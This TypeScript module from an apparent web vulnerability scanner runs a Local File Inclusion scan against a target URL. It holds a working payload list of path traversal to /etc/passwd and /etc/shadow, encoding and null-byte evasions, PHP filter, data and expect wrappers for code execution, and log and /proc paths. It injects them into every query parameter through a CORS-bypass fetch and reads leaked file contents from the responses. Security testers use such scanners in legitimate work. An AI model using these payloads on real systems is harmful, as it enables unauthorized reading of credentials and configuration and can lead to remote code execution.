import { normalizeUrl } from './apiUtils';
import { fetchWithBypass, CORSBypassMetadata } from './corsProxy';
import { RequestManager } from './requestManager';

export interface LFIScanResult {
  vulnerable: boolean;
  testedPayloads: number;
  vulnerabilities: Array<{
    payload: string;
    indicator: string;
    severity: 'critical' | 'high' | 'medium' | 'catastrophic'; // Added 'catastrophic'
    type: string;
    evidence?: string;
    parameter?: string;
    confidence: number;
  }>;
  tested: boolean;
  corsMetadata?: CORSBypassMetadata;
}

const LFI_ERROR_PATTERNS = [
  // Linux/Unix file content signatures
  /root:x:0:0:/i,  // /etc/passwd
  /daemon:x:1:1:/i, // /etc/passwd
  /bin:x:2:2:/i,    // /etc/passwd
  /sys:x:3:3:/i,    // /etc/passwd
  /nobody:x:/i,    // /etc/passwd
  /\[boot loader\]/i,  // boot.ini
  /\[extensions\]/i,  // php.ini
  /\[fonts\]/i,  // win.ini
  /DOCUMENT_ROOT/i,  // PHP environment
  /LoadModule/i,  // Apache config
  /extension=/i,  // PHP config
  /allow_url_include/i, // PHP config
  /disable_functions/i, // PHP config
  /ServerRoot/i, // Apache config
  /Listen \d+/i, // Apache config
  /User-Agent: /i, // /proc/self/environ or access logs
  /GET \//i, // access logs
  
  // Error messages indicating file access
  /failed to open stream/i,
  /No such file or directory/i,
  /Permission denied/i,
  /include_path/i,
  /failed opening/i,
  /Warning.*include/i,
  /require\(\): failed opening required/i,
  /Fatal error.*include/i,
  /file_get_contents/i, // Added
  /fopen\(/i, // Added
  
  // PHP wrappers exposure
  /php:\/\/filter/i, // Added
  /php:\/\/input/i,
  /data:\/\/text/i,
  /expect:\/\//i,
];

const LFI_PAYLOADS = [
  // Basic traversal (Linux/Unix)
  { payload: '../../../../../../../etc/passwd', type: 'Path Traversal (Unix)', severity: 'critical' as const, confidence: 0.98 }, // Increased confidence
  { payload: '....//....//....//....//....//....//etc/passwd', type: 'Path Traversal (Bypass)', severity: 'critical' as const, confidence: 0.95 }, // Increased confidence
  { payload: '..\\..\\..\\..\\..\\..\\..\\etc\\passwd', type: 'Path Traversal (Windows Style)', severity: 'high' as const, confidence: 0.85 },
  
  // Windows paths
  { payload: '../../../../../../../windows/system32/drivers/etc/hosts', type: 'Path Traversal (Windows)', severity: 'critical' as const, confidence: 0.98 }, // Increased confidence
  { payload: '..\\..\\..\\..\\..\\..\\..\\windows\\win.ini', type: 'Path Traversal (win.ini)', severity: 'high' as const, confidence: 0.9 },
  { payload: 'C:\\windows\\system32\\drivers\\etc\\hosts', type: 'Absolute Path (Windows)', severity: 'critical' as const, confidence: 0.98 }, // Increased confidence
  
  // Null byte injection (legacy PHP < 5.3)
  { payload: '../../../../../../../etc/passwd%00', type: 'Null Byte Injection', severity: 'critical' as const, confidence: 0.9 }, // Increased confidence
  { payload: '../../../../../../../etc/passwd%00.jpg', type: 'Null Byte + Extension', severity: 'critical' as const, confidence: 0.9 }, // Increased confidence
  
  // URL encoding evasion
  { payload: '..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', type: 'URL Encoded Traversal', severity: 'high' as const, confidence: 0.9 },
  { payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', type: 'Double URL Encoded', severity: 'high' as const, confidence: 0.85 },
  
  // PHP wrappers
  { payload: 'php://filter/convert.base64-encode/resource=index.php', type: 'PHP Filter Wrapper', severity: 'critical' as const, confidence: 0.98 }, // Increased confidence
  { payload: 'php://input', type: 'PHP Input Stream', severity: 'critical' as const, confidence: 0.95 }, // Increased confidence
  { payload: 'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+', type: 'Data URI Wrapper', severity: 'critical' as const, confidence: 0.95 }, // Increased confidence
  { payload: 'expect://id', type: 'Expect Wrapper (RCE)', severity: 'catastrophic' as const, confidence: 1.0 }, // Increased confidence
  
  // Log poisoning vectors
  { payload: '/var/log/apache2/access.log', type: 'Apache Log Access', severity: 'high' as const, confidence: 0.85 }, // Increased confidence
  { payload: '/var/log/nginx/access.log', type: 'Nginx Log Access', severity: 'high' as const, confidence: 0.85 }, // Increased confidence
  { payload: '../../../../../../../proc/self/environ', type: 'Proc Environ', severity: 'high' as const, confidence: 0.9 }, // Increased confidence
  { payload: '/proc/self/cmdline', type: 'Proc Cmdline', severity: 'medium' as const, confidence: 0.8 }, // Added
  { payload: '/proc/self/status', type: 'Proc Status', severity: 'medium' as const, confidence: 0.8 }, // Added
  
  // Config files
  { payload: '../../../../../../../etc/php/7.4/apache2/php.ini', type: 'PHP Config Access', severity: 'high' as const, confidence: 0.9 }, // Increased confidence
  { payload: '/etc/apache2/apache2.conf', type: 'Apache Config', severity: 'high' as const, confidence: 0.9 }, // Increased confidence
  { payload: '/etc/nginx/nginx.conf', type: 'Nginx Config', severity: 'high' as const, confidence: 0.9 }, // Added
  { payload: '/etc/shadow', type: 'Shadow File Access', severity: 'catastrophic' as const, confidence: 1.0 }, // Added
  
  // Advanced bypass techniques
  { payload: '....//....//etc/passwd', type: 'Filter Bypass (Dot Slash)', severity: 'high' as const, confidence: 0.8 },
  { payload: '..;/..;/..;/etc/passwd', type: 'Semicolon Bypass', severity: 'medium' as const, confidence: 0.75 },
];

const checkLFISignature = (response: string): { found: boolean; pattern?: string; confidence: number } => {
  const lowerResponse = response.toLowerCase();
  
  // High confidence for /etc/passwd structure
  if (/[a-z_][a-z0-9_-]*:[x\*]:[\d]+:[\d]+:/i.test(response) && response.includes('/bin/bash')) {
    return {
      found: true,
      pattern: 'Unix password file format detected',
      confidence: 0.99,
    };
  }
  
  // High confidence for /etc/shadow structure
  if (/[a-z_][a-z0-9_-]*:\$[a-z0-9\.\$]+\$[a-z0-9\.\$]+\$[a-z0-9\.\$]+/i.test(response)) {
    return {
      found: true,
      pattern: 'Unix shadow file format detected',
      confidence: 0.99,
    };
  }

  // High confidence for Windows INI file format (e.g., win.ini)
  if (/\[[a-z\s]+\]/i.test(response) && /;.*comment/i.test(response) && (response.includes('fonts') || response.includes('extensions'))) {
    return {
      found: true,
      pattern: 'Windows INI file format detected',
      confidence: 0.95,
    };
  }

  // High confidence for PHP config files
  if (lowerResponse.includes('php.ini') && lowerResponse.includes('extension=') && lowerResponse.includes('allow_url_include')) {
    return {
      found: true,
      pattern: 'PHP configuration file detected',
      confidence: 0.95,
    };
  }

  // High confidence for Apache config files
  if (lowerResponse.includes('apache2.conf') && lowerResponse.includes('serverroot') && lowerResponse.includes('listen')) {
    return {
      found: true,
      pattern: 'Apache configuration file detected',
      confidence: 0.95,
    };
  }

  // High confidence for Nginx config files
  if (lowerResponse.includes('nginx.conf') && lowerResponse.includes('http {') && lowerResponse.includes('server {')) {
    return {
      found: true,
      pattern: 'Nginx configuration file detected',
      confidence: 0.95,
    };
  }

  // Check for general LFI error messages
  for (const pattern of LFI_ERROR_PATTERNS) {
    const match = response.match(pattern);
    if (match) {
      return {
        found: true,
        pattern: match[0],
        confidence: 0.8, // Slightly lower confidence for generic errors
      };
    }
  }
  
  return { found: false, confidence: 0 };
};

export const performLFIScan = async (
  target: string,
  requestManager?: RequestManager,
  payloadLimit: number = 20
): Promise<LFIScanResult> => {
  console.log(`[LFI Scan] Starting Local File Inclusion scan for ${target} with ${payloadLimit} payloads`);
  
  const result: LFIScanResult = {
    vulnerable: false,
    testedPayloads: 0,
    vulnerabilities: [],
    tested: true,
  };

  try {
    const url = normalizeUrl(target);
    const urlObj = new URL(url);
    
    const params = new URLSearchParams(urlObj.search);
    const paramKeys = Array.from(params.keys());
    
    if (paramKeys.length === 0) {
      console.log('[LFI Scan] No parameters found, testing with common parameters');
      paramKeys.push('file', 'page', 'include', 'path'); // Common LFI parameters
      urlObj.search = '?file=index.php'; // Add a default parameter for testing
    }

    // Get baseline
    let baselineLength = 0;
    let baselineStatus = 0;
    try {
      const baselineResult = await fetchWithBypass(url, { timeout: 10000, signal: requestManager?.scanController?.signal });
      result.corsMetadata = baselineResult.metadata;
      const baselineText = await baselineResult.response.text();
      baselineLength = baselineText.length;
      baselineStatus = baselineResult.response.status;
      console.log(`[LFI Scan] Baseline: ${baselineStatus}, ${baselineLength} bytes`);
    } catch (error) {
      console.warn('[LFI Scan] Could not get baseline, continuing anyway');
    }

    const payloadsToTest = LFI_PAYLOADS.slice(0, payloadLimit);

    for (const paramKey of paramKeys) {
      for (const { payload, severity, type, confidence: baseConfidence } of payloadsToTest) {
        if (requestManager?.scanController?.signal.aborted) {
          throw new Error('Scan aborted');
        }

        try {
          const testUrl = new URL(url);
          const testParams = new URLSearchParams(testUrl.search);
          const originalValue = testParams.get(paramKey) || 'index.php'; // Use a default value if param is empty
          testParams.set(paramKey, originalValue + payload);
          testUrl.search = testParams.toString();

          console.log(`[LFI Scan] Testing ${type} on '${paramKey}': ${payload.substring(0, 40)}...`);

          let response: Response;
          if (requestManager) {
            response = await requestManager.fetch(testUrl.toString(), { timeout: 10000, signal: requestManager.scanController?.signal });
          } else {
            const testResult = await fetchWithBypass(testUrl.toString(), { timeout: 10000, signal: requestManager?.scanController?.signal });
            response = testResult.response;
          }
          
          result.testedPayloads++;

          const text = await response.text();
          const signatureCheck = checkLFISignature(text);

          if (signatureCheck.found && signatureCheck.confidence >= 0.7) { // Only consider high confidence detections
            console.log(`[LFI Scan] ⚠️ ${severity.toUpperCase()}: LFI vulnerability detected! ${signatureCheck.pattern}`);
            result.vulnerable = true;
            
            const evidenceStart = text.toLowerCase().indexOf(signatureCheck.pattern?.toLowerCase() || '');
            const evidence = evidenceStart >= 0
              ? text.substring(Math.max(0, evidenceStart - 100), Math.min(text.length, evidenceStart + 300))
              : text.substring(0, 400);
            
            result.vulnerabilities.push({
              payload,
              indicator: signatureCheck.pattern || 'File content exposed',
              severity,
              type,
              evidence: evidence.substring(0, 400) + (evidence.length > 400 ? '...' : ''),
              parameter: paramKey,
              confidence: signatureCheck.confidence,
            });
          }

          // Check for significant size changes, but with lower confidence if no signature
          if (baselineLength > 0 && signatureCheck.confidence < 0.9) { // Only if not already a high-confidence signature match
            const sizeDiff = Math.abs(text.length - baselineLength);
            const percentDiff = (sizeDiff / baselineLength) * 100;
            
            if (percentDiff > 50 && text.length > baselineLength && text.length < 100000) { // Ensure it's a significant increase, not just a small change
              console.log(`[LFI Scan] ⚠️ Suspicious content change: ${percentDiff.toFixed(1)}%`);
              
              if (!result.vulnerabilities.some(v => v.parameter === paramKey && v.payload === payload)) {
                result.vulnerable = true;
                result.vulnerabilities.push({
                  payload,
                  indicator: 'Significant response size increase',
                  severity: 'medium', // Lower confidence for size change alone
                  type,
                  evidence: `Response size: ${text.length} bytes (baseline: ${baselineLength}, +${percentDiff.toFixed(1)}%)`,
                  parameter: paramKey,
                  confidence: 0.6, // Lower confidence
                });
              }
            }
          }

          // Check for server errors (e.g., 500)
          if (baselineStatus > 0 && response.status !== baselineStatus && response.status >= 500) {
            console.log(`[LFI Scan] ⚠️ Server error detected (${response.status})`);
            if (!result.vulnerabilities.some(v => v.parameter === paramKey && v.payload === payload)) {
              result.vulnerable = true;
              result.vulnerabilities.push({
                payload,
                indicator: `HTTP ${response.status} error`,
                severity: 'high',
                type,
                evidence: `Server returned ${response.status} (baseline: ${baselineStatus})`,
                parameter: paramKey,
                confidence: 0.7,
              });
            }
          }

          await new Promise(resolve => setTimeout(resolve, 250)); // Small delay
        } catch (error: any) {
          if (error.message === 'Scan aborted') {
            throw error;
          }
          console.warn(`[LFI Scan] Payload test failed for ${paramKey} with ${payload.substring(0, 20)}...: ${error.message}`);
        }
      }
    }

    result.vulnerabilities = result.vulnerabilities.filter(v => v.confidence >= 0.7);

    console.log(`[LFI Scan] Complete: ${result.vulnerabilities.length} high-confidence vulnerabilities from ${result.testedPayloads} tests`);
    return result;
  } catch (error: any) {
    if (error.message === 'Scan aborted') {
      throw error;
    }
    console.error('[LFI Scan] Critical error:', error);
    return {
      vulnerable: false,
      testedPayloads: 0,
      vulnerabilities: [],
      tested: false,
    };
  }
};